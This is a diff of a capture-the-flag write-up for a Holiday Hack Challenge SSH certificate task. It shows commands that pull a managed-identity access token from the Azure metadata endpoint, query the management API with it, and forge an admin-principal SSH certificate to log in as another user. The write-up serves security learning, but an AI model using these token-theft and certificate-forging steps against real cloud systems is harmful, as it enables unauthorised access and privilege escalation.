@@ -547,17 +547,34 @@ Account: **monitor**
 
 Goal: **access TODO list**
 
+---
 
+Generate key pair
 
+```bash
+ ssh-keygen -t rsa -C "elf@ssh-server-vm.santaworkshopgeeseislands.org"
+```
 
+Paste the public key into
 
+```
+ https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl
+```
 
+This will generate the signed certificate. Only copy the necessary parts for the certificate and save to your host under a file name of your choice. I used "signed.pub"
 
+Use the cert and your private key to access ssh-server-vm.santaworkshopgeeseislands.org
 
+```bash
+┌──(root㉿kali)-[~/HHC23]
+└─# ssh monitor@ssh-server-vm.santaworkshopgeeseislands.org -i signed.pub -i id_rsa 
+```
 
+Ctrl+C to exit the application that loads on login
 
+![](/docs/assets/images/ssh1.png)
 
-Generate access token
+Generate access token ([Use managed identities on a virtual machine to acquire access token - Microsoft Entra ID | Microsoft Learn](https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token))
 
 ```bash
 curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s
@@ -575,7 +592,7 @@ Store token in result
 result="eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI0MDE5NzcsIm5iZiI6MTcwMjQwMTk3NywiZXhwIjoxNzAyNDg4Njc3LCJhaW8iOiJFMlZnWUZqbU5HLzd0VDNPZC9VbkIvZUhPQzFqQUFBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiJQLWJ6M3dkTmVVcTg3U29SSHVSSUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.GNKxaoFJEZnWENNPHiIc1KZbUaUODbCYMIgTWUY-7pEhVp_VqT0dPeeXRGStfaWDs3NoRKy72jkacg-aDSsqLKLYUZmAZAe9BJGk8eEnO0xUWSIyoJmzgbGMkv2uk9lwYfOcVD_MtEj0_cP9XdkAuIN7tuLWyUc7EKfvo671gNZPBfHyLSZ1yekmrOJjvNyQ8bMNT7X4zEZEg0dKdnovOeXhJjeX_2abJv0I4ddtDN-Cm-DsVDc3OcgiZGB4G2l603qbsYobde41pMMqhsz1iGjtGNbMDQyky0zwQGFxNzMjlsgiC7J3zrvmcPe_dSJILQTE4MdnH1AdQYiTmBBW4Q"
 ```
 
-Web Apps - Get Source Control
+Web Apps - Get Source Control ([Web Apps - Get Source Control - REST API (Azure App Service) | Microsoft Learn](https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01))
 
 ```bash
 monitor@ssh-server-vm:~$ curl -X GET   "https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01" -H "Authorization: Bearer $result"Output reformatted to JSON
@@ -623,6 +640,79 @@ Output reformatted to JSON
 }
 
 ```
+
+What other users are on this server other than monitor?
+
+```bash
+monitor@ssh-server-vm:/home$ ls
+alabaster  monitor
+```
+
+What principle has access to the user alabaster?
+
+```bash
+monitor@ssh-server-vm:/etc/ssh$ cd auth_principals/
+monitor@ssh-server-vm:/etc/ssh/auth_principals$ ls
+alabaster  monitor
+monitor@ssh-server-vm:/etc/ssh/auth_principals$ cat alabaster 
+admin
+monitor@ssh-server-vm:/etc/ssh/auth_principals$ 
+```
+
+Create keys for the admin principal
+
+```bash
+
+```
+
+After looking at Github code, it appears if you specify the principal it will use that principal value, otherwise it defaults to the OS environment variable DEFAULT_PRINCIPAL which must be elf. Create certificate for admin via CURL and specify the principal 
+
+```bash
+ curl -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"ssh_pub_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0+n6OAfimJ6D0CL3Oa7D3J+qJhYtz2RgBnE6pqNgsa/SmrDGnRYzu47LKCS2gCS+Do4ND8wK49GmSoxq4M+YRRDIqtVqSql7xEXbol7vSN8bTM2bAOMrjhz9RU4i9QzrwxafRoLMfDShbhyBaUjeT+GKmnI4072VNdqHGVbimUXCj+chMMrP+nA3doAalajyrG8YQfv76PqruwEBXxE8n0GJoWFnP3QQBzHQGMInaE4d8x+IJG/8f4S5XTnQY0giBm9aAQ1CJcXWbwuEKS4HJH/GPEQu6WB0xSegUejJujoYnSIN6/kBqHdEi0wRpVmrN67T6DwrPAxT6jgNTPOP4U2c61QapkRpGXLR1usr8WF1UZ8gAjGJgGsyYQ3nb3fqmh8ARLQZE9DNyZXEjUSKhOf3SOzDlOEzKdMkzvXSzL/Cj2Qsj7CCEuRpf7dRQXJ3k0GJdvd7OGDjs6bOfdK4ewevaCQpj3WgV633jI7xFEOALuF+FZrb1vwwyyHi6IF0= admin@ssh-server-vm.santaworkshopgeeseislands.org", "principal": "admin"}' \  
+
+```
+
+Create a public cert file to hold the value, in my case admin.pub
+
+```
+echo "rsa-sha2-512-cert-v01@openssh.com AAAAIXJzYS1zaGEyLTUxMi1jZXJ0LXYwMUBvcGVuc3NoLmNvbQAAACcxOTk2OTc4MjM2MjI3NzUwMjczODE1NTgwNzQxMTI5OTI2ODYwODIAAAADAQABAAABgQC0+n6OAfimJ6D0CL3Oa7D3J+qJhYtz2RgBnE6pqNgsa/SmrDGnRYzu47LKCS2gCS+Do4ND8wK49GmSoxq4M+YRRDIqtVqSql7xEXbol7vSN8bTM2bAOMrjhz9RU4i9QzrwxafRoLMfDShbhyBaUjeT+GKmnI4072VNdqHGVbimUXCj+chMMrP+nA3doAalajyrG8YQfv76PqruwEBXxE8n0GJoWFnP3QQBzHQGMInaE4d8x+IJG/8f4S5XTnQY0giBm9aAQ1CJcXWbwuEKS4HJH/GPEQu6WB0xSegUejJujoYnSIN6/kBqHdEi0wRpVmrN67T6DwrPAxT6jgNTPOP4U2c61QapkRpGXLR1usr8WF1UZ8gAjGJgGsyYQ3nb3fqmh8ARLQZE9DNyZXEjUSKhOf3SOzDlOEzKdMkzvXSzL/Cj2Qsj7CCEuRpf7dRQXJ3k0GJdvd7OGDjs6bOfdK4ewevaCQpj3WgV633jI7xFEOALuF+FZrb1vwwyyHi6IF0AAAAAAAAAAQAAAAEAAAAkZDk2Zjg1YTctMWJlMS00ZTRlLWFhNzktMzNhNGVlMmIzOWQ2AAAACQAAAAVhZG1pbgAAAABleNnaAAAAAGWdxQYAAAAAAAAAEgAAAApwZXJtaXQtcHR5AAAAAAAAAAAAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIGk2GNMCmJkXPJHHRQH9+TM4CRrsq/7BL0wp+P6rCIWHAAAAUwAAAAtzc2gtZWQyNTUxOQAAAEDbnp12sOwrKKtyDh8G5M9mPpoNemlrgoxqXvOo00pzxHgqXVue9MC1xUIpbYSTXwWg9ucK8nMilkJbY5HpjYwH" > admin.pub  
+```
+
+Login as Alabaster
+
+```bash
+ssh -i admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org -i id_rsa
+Last login: Tue Dec 12 22:17:15 2023 from 206.83.30.183
+alabaster@ssh-server-vm:~$
+```
+
+
+Let's check out his TODO list :) 
+
+```bash
+alabaster@ssh-server-vm:~$ cat alabaster_todo.md 
+# Geese Islands IT & Security Todo List
+
+- [X] Sleigh GPS Upgrade: Integrate the new "Island Hopper" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.
+- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.
+- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!
+- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.
+- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!
+- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.
+- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure.
+```
+
+Insert 
+
+```
+Gingerbread
+```
+
+into your badge for GLORY!
+
+
 
 ---
 
